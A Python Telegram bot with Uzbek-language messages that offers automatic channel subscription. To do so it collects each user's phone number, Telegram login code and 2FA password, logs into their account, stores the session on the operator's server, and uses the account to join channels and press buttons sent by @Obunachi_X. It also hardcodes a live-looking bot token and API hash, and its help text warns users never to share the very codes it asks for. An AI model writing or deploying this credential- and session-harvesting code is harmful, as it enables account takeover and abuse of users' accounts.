import asyncio
import os
import sys
from telethon import TelegramClient, events
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.types import Message
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# Bot token
BOT_TOKEN = "8573440155:AAG2oHadY9thbvfRIYpIBMPcwhL9iw_hVL4"

# Telegram API
API_ID = 20464354
API_HASH = "c6fa656e333fd6c9d5b9867daf028ea1"

# Bot username
BOT_USERNAME = "Obunachi_X"

# Global o'zgaruvchilar
client = None
user_states = {}  # {user_id: 'waiting_phone', 'waiting_code', 'waiting_password', 'active'}
pending_sessions = {}  # {user_id: {'phone': phone, 'code_hash': code_hash}}

# Bot uchun import
try:
    from telegram import Bot, Update, InlineKeyboardMarkup, InlineKeyboardButton
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
except ImportError:
    print("Installing required packages...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.3"])
    from telegram import Bot, Update, InlineKeyboardMarkup, InlineKeyboardButton
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler

# Telethon client yaratish
def create_telethon_client(phone):
    session_name = f"sessions/session_{phone.replace('+', '')}"
    return TelegramClient(session_name, API_ID, API_HASH)

# Tugmalarni bosish funksiyasi
async def click_buttons(message: Message):
    results = []
    if message.buttons:
        for row in message.buttons:
            for button in row:
                # URL tugma (kanal havolasi)
                url = getattr(button, "url", None)
                if url:
                    try:
                        if "joinchat" in url or "+" in url:
                            # Invite link (masalan: https://t.me/+xxxx)
                            invite_hash = url.split("+")[-1]
                            await client(ImportChatInviteRequest(invite_hash))
                            results.append(f"✅ Invite orqali obuna bo'ldi: {url}")
                        else:
                            # Oddiy kanal (masalan: https://t.me/kanal_nomi)
                            kanal = url.split("/")[-1]
                            await client(JoinChannelRequest(kanal))
                            results.append(f"✅ Kanalga obuna bo'ldi: {kanal}")
                    except Exception as e:
                        results.append(f"⚠️ Obuna bo'lmadi: {e}")

                # Callback tugma (tasdiqlash tugmasi)
                data = getattr(button, "data", None)
                if data:
                    try:
                        await button.click()
                        results.append("✅ Tasdiqlash tugmasi bosildi")
                    except Exception as e:
                        results.append(f"⚠️ Tasdiqlash tugmasi ishlamadi: {e}")
    
    return results

# Telegram Bot handlers
async def start_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_states[user_id] = 'waiting_phone'
    
    await update.message.reply_text(
        "👋 **Obunachi Botiga xush kelibsiz!**\n\n"
        "Botni ishga tushirish uchun telefon raqamingizni yuboring:\n"
        "**Namuna:** `+998901234567`\n\n"
        "⚠️ **Diqqat:** Bu raqam kanallarga obuna bo'lish uchun ishlatiladi."
    )

async def handle_phone_number(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    phone = update.message.text.strip()
    
    if user_states.get(user_id) != 'waiting_phone':
        return
    
    # Formatni tekshirish
    if not phone.startswith('+'):
        phone = '+' + phone
    
    await update.message.reply_text(f"📱 **Telefon raqam qabul qilindi:** `{phone}`\n"
                                   f"Kod so'ralmoqda...")
    
    global client
    try:
        # Telethon client yaratish
        client = create_telethon_client(phone)
        
        # Connect qilish
        await client.connect()
        
        # Kod so'rash
        sent_code = await client.send_code_request(phone)
        code_hash = sent_code.phone_code_hash
        
        # Session ma'lumotlarini saqlash
        pending_sessions[user_id] = {
            'phone': phone,
            'code_hash': code_hash
        }
        
        user_states[user_id] = 'waiting_code'
        
        await update.message.reply_text(
            f"📨 Telegram'dan kelgan **5 xonali kodni** yuboring:\n\n"
            f"⚠️ **Kodni shu formatda yuboring:** `12345`"
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Xatolik: {str(e)}")
        user_states[user_id] = 'waiting_phone'

async def handle_auth_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    code = update.message.text.strip()
    
    if user_states.get(user_id) != 'waiting_code':
        return
    
    if not code.isdigit() or len(code) != 5:
        await update.message.reply_text("❌ **Kod 5 xonali raqam bo'lishi kerak!**")
        return
    
    await update.message.reply_text("🔐 **Kod tekshirilmoqda...**")
    
    if user_id not in pending_sessions:
        await update.message.reply_text("❌ Session topilmadi. Qayta /start boshing.")
        user_states[user_id] = 'waiting_phone'
        return
    
    session_data = pending_sessions[user_id]
    phone = session_data['phone']
    code_hash = session_data['code_hash']
    
    try:
        # Kod bilan login qilish
        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
        
        user_states[user_id] = 'active'
        del pending_sessions[user_id]
        
        await update.message.reply_text(
            "✅ **Muvaffaqiyatli kirildi!**\n"
            "Endi /menu buyrug'i orqali ishni boshlashingiz mumkin.\n\n"
            "🤖 Bot endi @Obunachi_X dan xabarlarni kuzatib, avtomatik obuna bo'ladi."
        )
        
        # Botga subscribe qilish
        try:
            await client(JoinChannelRequest(BOT_USERNAME))
        except:
            pass
        
        # Avtomatik obuna bo'lishni boshlash
        asyncio.create_task(start_auto_subscribe(user_id, update))
        
    except SessionPasswordNeededError:
        user_states[user_id] = 'waiting_password'
        await update.message.reply_text(
            "🔐 **2FA paroli kerak.**\n"
            "Telegram akkauntingizning 2 qadamli autentifikatsiya parolini yuboring:\n\n"
            "⚠️ **Parolni shu formatda yuboring:** `meningparol123`"
        )
        
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ **Noto'g'ri kod.** Qayta urinib ko'ring.")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Xatolik: {str(e)}")
        user_states[user_id] = 'waiting_phone'

async def handle_2fa_password(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    
    if user_states.get(user_id) != 'waiting_password':
        return
    
    await update.message.reply_text("🔒 **Parol tekshirilmoqda...**")
    
    if user_id not in pending_sessions:
        await update.message.reply_text("❌ Session topilmadi.")
        user_states[user_id] = 'waiting_phone'
        return
    
    try:
        # 2FA paroli bilan login qilish
        await client.sign_in(password=password)
        
        user_states[user_id] = 'active'
        del pending_sessions[user_id]
        
        await update.message.reply_text(
            "✅ **2FA paroli qabul qilindi!**\n"
            "Endi /menu buyrug'i orqali ishni boshlashingiz mumkin.\n\n"
            "🤖 Bot endi @Obunachi_X dan xabarlarni kuzatib, avtomatik obuna bo'ladi."
        )
        
        # Botga subscribe qilish
        try:
            await client(JoinChannelRequest(BOT_USERNAME))
        except:
            pass
        
        # Avtomatik obuna bo'lishni boshlash
        asyncio.create_task(start_auto_subscribe(user_id, update))
        
    except Exception as e:
        await update.message.reply_text(f"❌ Noto'g'ri parol. Qayta urinib ko'ring: {str(e)}")

async def start_auto_subscribe(user_id, update):
    """Avtomatik obuna bo'lishni boshlash"""
    try:
        # Botdan xabarlarni kuzatish
        @client.on(events.NewMessage(chats=BOT_USERNAME))
        async def handler(event):
            try:
                results = await click_buttons(event.message)
                if results:
                    message = "📋 **Obuna natijalari:**\n\n" + "\n".join(results[:5])
                    if len(results) > 5:
                        message += f"\n\n...va yana {len(results)-5} ta natija"
                    
                    # Foydalanuvchiga xabar yuborish
                    try:
                        bot_app = update.application if update else None
                        if bot_app:
                            await bot_app.bot.send_message(
                                chat_id=user_id,
                                text=message,
                                parse_mode='HTML'
                            )
                    except:
                        pass
                        
            except Exception as e:
                print(f"Error in handler: {e}")
        
        await update.message.reply_text(
            "🔄 **Avtomatik obuna boshlandi!**\n"
            "Bot endi @Obunachi_X dan kelgan xabarlarda tugmalarni avtomatik bosadi.\n\n"
            "✅ Kanal havolalari bo'lsa, obuna bo'linadi\n"
            "✅ Tasdiqlash tugmalari bo'lsa, bosiladi\n\n"
            "📊 Natijalar sizga yuboriladi."
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Avtomatik obuna sozlamasida xatolik: {str(e)}")

async def menu_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if user_states.get(user_id) != 'active':
        await update.message.reply_text("❌ **Avval telefon raqam orqali kirishingiz kerak!**\n"
                                       "/start bosib qayta urinib ko'ring.")
        return
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Obuna bolidim", callback_data="subscribe_now")],
        [InlineKeyboardButton("📊 Status", callback_data="check_status")],
        [InlineKeyboardButton("🛑 To'xtatish", callback_data="stop_auto")]
    ])
    
    await update.message.reply_text(
        "📱 **Obunachi Bot Menyusi**\n\n"
        "✅ **Holat:** Faol\n"
        "🤖 **Bot:** @Obunachi_X ga ulangan\n"
        "🔗 **Avtomatik obuna:** Yoqilgan\n\n"
        "Quyidagi tugmalardan foydalaning:",
        reply_markup=keyboard
    )

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    
    await query.answer()
    
    if data == "subscribe_now":
        if user_states.get(user_id) != 'active':
            await query.edit_message_text("❌ Avval telefon raqam orqali kirishingiz kerak!")
            return
        
        # Hozirgi xabarlarni tekshirish
        try:
            messages = await client.get_messages(BOT_USERNAME, limit=5)
            for msg in messages:
                results = await click_buttons(msg)
                if results:
                    await query.edit_message_text(
                        f"✅ **Obuna jarayoni:**\n\n" + "\n".join(results[:3]),
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🔄 Yangilash", callback_data="subscribe_now")]
                        ])
                    )
                    return
            
            await query.edit_message_text(
                "❌ Hozircha obuna qiladigan xabar topilmadi.\n"
                "Bot @Obunachi_X dan yangi xabar kutmoqda.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Qayta urinish", callback_data="subscribe_now")]
                ])
            )
            
        except Exception as e:
            await query.edit_message_text(f"❌ Xatolik: {str(e)}")
    
    elif data == "check_status":
        status = user_states.get(user_id, 'not_started')
        status_text = {
            'waiting_phone': "📞 Telefon raqam kutilmoqda",
            'waiting_code': "🔐 Auth kodi kutilmoqda",
            'waiting_password': "🔒 2FA paroli kutilmoqda",
            'active': "✅ Session faol",
            'not_started': "❌ Session yo'q"
        }
        
        await query.edit_message_text(
            f"📊 **Bot Holati:**\n\n"
            f"👤 **Foydalanuvchi ID:** {user_id}\n"
            f"📱 **Holat:** {status_text.get(status, 'Noma\'lum')}\n"
            f"🤖 **Monitor bot:** @{BOT_USERNAME}\n"
            f"🔗 **Avtomatik obuna:** {'✅ Yoqilgan' if status == 'active' else '❌ O\'chirilgan'}"
        )
    
    elif data == "stop_auto":
        # Avtomatik obunani to'xtatish
        user_states[user_id] = 'waiting_phone'
        if client:
            client.remove_event_handler(client._event_builders.get((events.NewMessage, (BOT_USERNAME,))))
        
        await query.edit_message_text(
            "🛑 **Avtomatik obuna to'xtatildi!**\n\n"
            "Qayta ishga tushirish uchun /start ni bosing."
        )

async def help_command(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "📖 **Yordam:**\n\n"
        "1. `/start` - Botni ishga tushirish\n"
        "2. Telefon raqamingizni yuboring\n"
        "3. Telegram'dan kelgan 5 xonali kodni yuboring\n"
        "4. Agar 2FA bo'lsa, parolni yuboring\n"
        "5. `/menu` - Asosiy menyuni ochish\n"
        "6. Bot avtomatik @Obunachi_X dan xabarlarni kuzatadi\n\n"
        "⚠️ **Diqqat:** Kod va parollaringizni hech kimga bermang!"
    )

async def status_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    status = user_states.get(user_id, 'not_started')
    status_text = {
        'waiting_phone': "📞 Telefon raqam kutilmoqda",
        'waiting_code': "🔐 Auth kodi kutilmoqda",
        'waiting_password': "🔒 2FA paroli kutilmoqda",
        'active': "✅ Session faol",
        'not_started': "❌ Session yo'q"
    }
    
    await update.message.reply_text(f"📊 **Holat:** {status_text.get(status, 'Noma\'lum')}")

async def main():
    # Fayllar uchun papka yaratish
    if not os.path.exists("sessions"):
        os.makedirs("sessions")
    
    # Botni yaratish
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("menu", menu_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, 
                                         lambda update, context: asyncio.create_task(
                                             handle_phone_number(update, context) 
                                             if user_states.get(update.effective_user.id) == 'waiting_phone' 
                                             else (handle_auth_code(update, context) 
                                                   if user_states.get(update.effective_user.id) == 'waiting_code' 
                                                   else handle_2fa_password(update, context))
                                         )))
    
    print(f"🤖 Bot ishga tushmoqda...")
    print(f"📞 Bot token: {BOT_TOKEN[:10]}...")
    print(f"🔗 Bot username: {BOT_USERNAME}")
    print(f"📁 Sessions papkasi: sessions/")
    
    # Botni ishga tushirish
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    print("✅ Bot muvaffaqiyatli ishga tushdi!")
    print("📋 Foydalanish tartibi:")
    print("1. Botga /start bosing")
    print("2. Telefon raqamingizni yuboring")
    print("3. Telegram'dan kelgan kodni yuboring")
    print("4. Agar 2FA bo'lsa, parolni yuboring")
    print("5. /menu bosing va ishni boshlang")
    
    # Dasturni to'xtatmaslik uchun
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot to'xtatildi.")
    except Exception as e:
        print(f"❌ Xatolik: {e}")